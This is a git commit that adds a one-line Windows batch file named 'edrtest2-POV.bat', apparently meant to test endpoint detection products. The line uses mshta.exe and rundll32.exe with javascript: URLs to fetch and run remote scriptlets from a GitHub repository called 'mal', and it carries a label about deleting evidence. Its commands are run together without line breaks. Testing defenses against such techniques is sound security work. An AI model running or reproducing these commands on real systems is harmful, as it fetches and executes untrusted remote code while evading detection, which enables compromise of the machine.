5c5a7dfd7243dede47280c844ab25e41df26869e
harasay <114565656+harasay@users.noreply.github.com>
2023-03-03 14:09:28 +0900

    Create edrtest2-POV.bat

---
+++ edrtest2-POV.bat
@@ -0,0 +1,1 @@
+echo EDR test powershell activitymshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/scriptsample/mal/master/edrtest2-POV")).Exec();close()timeout 5echo EDR test delete evidencerundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/scriptsample/mal/master/edrtest3-POV")
